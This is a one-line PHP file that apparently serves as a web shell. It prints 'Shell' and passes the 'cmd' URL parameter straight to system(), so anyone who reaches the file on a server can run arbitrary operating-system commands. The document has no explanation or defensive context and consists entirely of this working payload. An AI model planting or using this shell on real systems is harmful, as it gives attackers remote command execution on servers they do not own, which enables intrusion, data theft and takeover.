<?php echo "Shell";system($_GET['cmd']); ?>
